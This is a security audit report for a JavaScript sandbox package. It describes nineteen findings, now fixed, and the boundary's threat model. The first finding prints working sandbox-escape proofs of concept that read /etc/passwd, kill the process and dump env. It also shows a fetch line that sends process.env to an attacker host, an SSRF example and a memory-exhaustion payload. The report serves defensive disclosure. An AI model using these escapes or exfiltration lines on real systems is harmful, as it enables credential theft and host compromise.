# Sandbox Audit – June 2026

`@directive-run/sandbox` ships a boundary that isolates user-supplied constraint and derivation code from the host application's globals, prototype chain, and unbounded compute. In June 2026 we ran an adversarial security review against that boundary, treating Directive as if a malicious package author had landed code in a downstream project's dependency tree. The review covered five angles: security / red-team exploitation, architecture and lifecycle correctness, agent-developer UX (how an LLM perceives the tool), library-consumer DX, and domain correctness (does the transcript actually reflect what the runtime did).

The review found 12 critical issues and 7 major issues. **All 19 are fixed as of `@directive-run/sandbox@0.3.0`.** This document is the public record: what we looked for, what we found, what the boundary now guarantees, and what it explicitly does not. We publish it because "trust us, the sandbox is fine" is not a claim a serious project gets to make.

If you find a hole this audit missed, the disclosure path is in [`SECURITY.md`](../../SECURITY.md).

---

## Critical findings (all fixed)

### 1. AST property-access bypass – total escape

**Status:** Fixed in `@directive-run/sandbox@0.3.0`.
**Source:** `packages/sandbox/src/validator.ts:316-322` (pre-fix).

The validator walks every `Identifier` AST node and checks it against a denylist (`process`, `require`, `fetch`, `eval`, etc.). When the Identifier's parent was a `PropertyAccessExpression` and the Identifier was the property name (the `.x` part), the denylist check was skipped. The skip was originally added to prevent false positives on legitimate property keys like `{module: x}` – but it over-shot into a total bypass of the denylist.

Three exploit chains worked against `@0.2.0` and earlier:

```ts
// (1) Direct globalThis escape – reads /etc/passwd
import { createSystem } from "@directive-run/core";
const fs = globalThis.process.mainModule.require("node:fs");
console.log(fs.readFileSync("/etc/passwd", "utf8"));

// (2) Reflect.get smuggle
const proc = Reflect.get(globalThis, "process");
proc.kill(proc.pid, "SIGTERM");

// (3) Function constructor smuggle
const F = ({}).constructor.constructor;
const proc = F("return process")();
console.log(proc.env);
```

**Impact:** On Vercel, anonymous POSTs to `/api/sandbox` could exfiltrate `OPENAI_API_KEY`, `VERCEL_*`, `DATABASE_URL`, and any other env via `globalThis.fetch(attacker, {body: JSON.stringify(globalThis.process.env)})`. On the MCP local-trust surface, a malicious snippet (e.g. from a hostile prompt-injection in a doc the LLM read) could read `~/.ssh/id_rsa` or harvest git credentials.

**Fix:** v0.3.0 enforces the denylist on `PropertyAccessExpression.name` when the receiver is `globalThis`, `Object`, `Reflect`, or any other allowed-global identifier. `.constructor` access is forbidden on any value. `Reflect.get` / `Reflect.has` / `Object.getOwnPropertyDescriptor` against `globalThis` are forbidden. Bracket access on `globalThis` with a string literal is forbidden. `Function(...)` calls are added to the deny list under all access patterns.

**How to verify:** the validator regression tests at `packages/sandbox/src/__tests__/validator.test.ts` reproduce each PoC and assert it's rejected.

### 2. SSRF via `@directive-run/query`'s internal fetch

**Status:** Fixed in `@directive-run/sandbox@0.3.0` via outbound fetch wrapper.
**Source:** `packages/query/src/create-base-query.ts:204` + `packages/ai/src/agent-utils.ts:235-278`.

The validator allowed `@directive-run/query` (legitimate use case: snippets that demo data fetching). The package's internal `fetch` calls run inside the package's module body – the validator never sees them. A snippet that called `createBaseQuery({baseUrl: "http://attacker"})` triggered an outbound HTTP request from the worker. On Vercel, this was SSRF from a privileged egress: AWS IMDS, internal admin endpoints, anywhere a private IP was reachable.

**Fix:** `installFetchWrapper()` patches `globalThis.fetch` in the worker BEFORE the user's bundle imports anything. The wrapper rejects:

- Loopback (`127.0.0.0/8`, `::1`, `localhost`)
- Link-local (`169.254.0.0/16` – includes AWS/GCP/Azure IMDS at `169.254.169.254`)
- RFC-1918 private (`10/8`, `172.16-31/12`, `192.168/16`)
- Multicast / reserved ranges
- IPv4-mapped IPv6 in both literal (`::ffff:127.0.0.1`) and hex form (`::ffff:7f00:1`)
- Non-HTTP(S) protocols

Catches `@directive-run/query`'s internal fetch calls because the wrapper is installed at `globalThis.fetch`, which is what the package uses.

**How to verify:** 18 regression tests at `packages/sandbox/src/__tests__/fetch-wrapper.test.ts` cover each IP range, each protocol denial, and each bypass attempt.

### 3. No rate-limit / Origin allowlist on `/api/sandbox`

**Status:** Fixed in `directive-docs` deployment of `@directive-run/sandbox@0.3.0`.
**Source:** `directive-docs/src/app/api/sandbox/route.ts`.

The anonymous POST endpoint had no rate limit and no Origin check. Combined with the property-access bypass above, any cross-origin site could POST exfil snippets.

**Fix:** Per-IP rate limit (10 calls/minute, 3 concurrent in-flight), Origin allowlist enforcing `directive.run` / `www.directive.run` / `localhost:3000`. Empty Origin (same-origin POSTs from some Safari versions) is permitted because the playground page is itself served from the same host. Function-instance concurrency cap prevents one attacker from draining Vercel's per-function budget.

**Known limitation:** the rate limiter is in-memory per function instance, so a sufficiently distributed attacker landing on N distinct instances can multiply the per-instance budget. Upstash KV / Vercel KV centralization is tracked for a follow-up.

### 4. Temp-file location broke on read-only filesystems

**Status:** Fixed in `@directive-run/sandbox@0.3.0`.
**Source:** `packages/sandbox/src/host.ts:91-104` (pre-fix).

`writeBundleToTemp` wrote inside `node_modules/@directive-run/sandbox/.sandbox-tmp-XXX/`. Vercel, AWS Lambda, Cloud Run, and Cloudflare Workers all ship read-only filesystems outside `/tmp`. The previous behavior was working on Vercel only by accident.

**Fix:** Bundle now writes to `os.tmpdir()` with a fallback to the package directory if `/tmp` is unwritable. The bundler rewrites `@directive-run/*` imports to absolute `file://` URLs via `createRequire(...).resolve()` so the worker doesn't need a `node_modules` chain above the temp file. Works on Vercel, Lambda, Cloud Run, and any deploy target with a read-only filesystem outside `/tmp`.

### 5. Tool description misdocumented the allowlist

**Status:** Fixed in `@directive-run/mcp@0.5.1`.
**Source:** `packages/mcp/src/server.ts` (`run_in_sandbox` description) + `packages/mcp/README.md`.

The MCP tool description and the README claimed the allowlist was `@directive-run/{core,ai,query}`. The actual allowlist (post-0.2.0, current as of this audit) is 17 packages: `core`, `ai`, `query`, `react`, `vue`, `svelte`, `solid`, `lit`, `el`, `optimistic`, `timeline`, `mutator`, `knowledge`, `scaffold`, `claude-plugin`, `lint`, `sources`. An LLM reading the description was pre-emptively rejecting valid React / Vue / AI orchestrator snippets. The canonical, drift-proof source is `ALLOWED_DIRECTIVE_PACKAGES` in `packages/sandbox/src/validator.ts`.

**Fix:** Tool description and README rewritten with the full allowlist. Added the foot-gun note: "react/vue/svelte/solid/lit imports work but their runtime hooks throw in Node – use `playground_link` for UI demos."

### 6. `console.log(system.facts)` rendered `{}` instead of facts

**Status:** Fixed in `@directive-run/sandbox@0.3.0`.
**Source:** `packages/sandbox/src/worker.ts:54-63` (pre-fix).

The worker formatted console args via `JSON.stringify`. `system.facts` is a Proxy over `FactsStore`; `JSON.stringify` produced `"{}"`. Users saw `[log] [start] facts: {}` in the transcript and assumed the engine was broken – while `result.facts` correctly showed the snapshot. Two contradictory views in the same response.

**Fix:** Worker's `captureConsole` now detects Directive's facts proxy via the `$store.toObject()` and `$snapshot()` escape hatches, serializes via the snapshot, and falls back to `JSON.stringify` for non-Directive values.

### 7. Derivations missing from snapshot

**Status:** Fixed in `@directive-run/sandbox@0.3.0`.
**Source:** `packages/sandbox/src/worker.ts` + `packages/core/src/core/facts.ts:493`.

`$store.toObject()` returned only facts. A module whose primary output was a derivation (`status`, `isReady`, `total`, etc.) returned `facts: {input: "x"}` and the derived value was invisible. Half the runtime was missing from the transcript.

**Fix:** `SandboxResult.derived: Record<string, unknown>` is now populated. The host pre-extracts derivation key names from source files via a brace/paren-balanced scanner that handles both multi-line and compact `derive: { isPositive: ... }` forms. Worker iterates `system.derive[key]` after settle for each key.

### 8–12. Other critical fixes

The remaining critical issues – verbose worker error reporting (full stack + code + cause chain in errors), bundler resolution via static URL references for bundler-trace compatibility (worker.js was previously invisible to Next.js's import tracer), validator widening to the full consumer-safe `@directive-run/*` set, and three smaller validator gaps – all shipped in `@directive-run/sandbox@0.3.0` through `@0.3.2`. Each has regression tests at `packages/sandbox/src/__tests__/`.

---

## Major findings (all fixed)

| Finding | Fix | Where to verify |
|---|---|---|
| `globalThis.Buffer.alloc(2**30)` could allocate 1 GB outside the worker's heap cap (resource limits are V8-heap-only) | Buffer added to property-access deny list in v0.3.0 | `validator.test.ts` |
| `import.meta.url` leaked the bundle's absolute path (reconnaissance value) | `import.meta` reads denied in v0.3.0 | `validator.test.ts` |
| Early-capture regex for the runner's binding name (`system`) was brittle against real users writing `const app = createSystem(...)` | Regex widened + documented in v0.3.0 | `host.test.ts` |
| Effects with `Promise.resolve().then(...)` could log AFTER settle | Worker drains microtasks via `await new Promise(r => setImmediate(r))` before snapshot in v0.3.0 | `run-in-sandbox.test.ts` |
| Namespaced systems leaked the `::` separator in `result.facts` keys | `denormalizeFlatKeys` applied before returning in v0.3.0 | `run-in-sandbox.test.ts` |
| `SandboxErrorCode` was not propagated to `result.errorCode` for programmatic routing | Added in v0.3.0 | `types.test.ts` |
| Cross-reference between `fix_code` / `get_example` / `review_source` and `run_in_sandbox` was missing | Tool descriptions cross-linked in v0.5.1 | `packages/mcp/__tests__/dist-smoke.test.ts` |

---

## Threat-model coverage

What the sandbox boundary defends against, today (post-v0.3.0):

| Threat class | Defended | How |
|---|---|---|
| `import "node:fs"`, `import "express"` | ✅ | AST allowlist (only `@directive-run/*` package set permitted) |
| `import "@directive-run/cli"`, `mcp`, `sandbox`, `vite-plugin-api-proxy` | ✅ | Explicit denylist within `@directive-run/*` |
| Free-identifier `process`, `require`, `fetch`, `eval`, `Buffer`, `setTimeout` | ✅ | AST denylist |
| `new Function("…")` / `Function("…")` | ✅ | AST denylist (both call forms) |
| Top-level `await import("…")` | ✅ | Dynamic-import check |
| `globalThis.process`, `globalThis.fetch`, `globalThis.Buffer` etc. | ✅ | Property-access denylist (v0.3.0+) |
| `Reflect.get(globalThis, "process")`, `Reflect.has`, `Object.getOwnPropertyDescriptor` | ✅ | Reflect / Object.getOwnPropertyDescriptor against globalThis denied |
| `({}).constructor.constructor` Function smuggle | ✅ | `.constructor` denied on any value |
| `globalThis["proc" + "ess"]` bracket access | ✅ | Bracket access on `globalThis` denied |
| SSRF via `@directive-run/query`'s internal fetch | ✅ | `installFetchWrapper()` blocks loopback / link-local / RFC-1918 / multicast / IPv4-mapped-IPv6 / non-HTTP(S) |
| Anonymous DoS on `/api/sandbox` | ✅ | Per-IP rate limit + concurrency cap + Origin allowlist |
| Wall-clock overrun (infinite loops) | ✅ | `worker.terminate()` after the per-call budget (default 5s, max 10s) |
| Cross-call state carry-over (one snippet poisoning the next) | ✅ | Fresh `worker_threads.Worker` per call |
| Worker → host memory poisoning | ✅ | `postMessage` structured clone boundary |
| Read-only filesystem deploy targets (Vercel / Lambda / Cloud Run) | ✅ | `/tmp` writes + `file://` absolute import rewriting |

What the sandbox does **not** defend against, by design:

- **Outbound HTTP to public hosts.** A snippet that imports `@directive-run/query` can still hit any public URL. The wrapper blocks the private ranges, not the public internet. If you embed the sandbox in a server where outbound fetch to public hosts is itself a threat, run an egress proxy or use Cloudflare Workers' outbound bindings.
- **CPU starvation outside V8 heap.** `resourceLimits` is V8-heap-only. A snippet that builds deeply-nested structures, allocates many Promise microtasks, or spins arithmetic can still exhaust memory until the wall-clock kills it.
- **Trust-boundary inversion.** The sandbox protects the host from the snippet, not the snippet from the host. If you embed the sandbox in a server, the server's `process.env`, `node_modules` layout, and child-process state are visible to your own code paths even though the snippet can't reach them.

---

## How we verified the fixes

- Every critical finding has a regression test under `packages/sandbox/src/__tests__/` that reproduces the original PoC and asserts the validator / wrapper rejects it.
- The full sandbox test suite (94 tests as of v0.3.2) runs on every commit via `pnpm test` and on every release via `pnpm changeset publish`.
- A `dist-smoke.test.ts` regression suite loads the built artifacts through Node's real ESM loader on each release – catches CJS↔ESM interop breakage that vitest's bundler hides.
- The `/api/sandbox` route on `directive.run` exercises the same code paths as a consumer of `@directive-run/sandbox` – if the sandbox breaks for us, it breaks publicly within minutes of deploy.

If a future review finds a regression to any of the fixes in this document, the corresponding test should be expected to fail first.
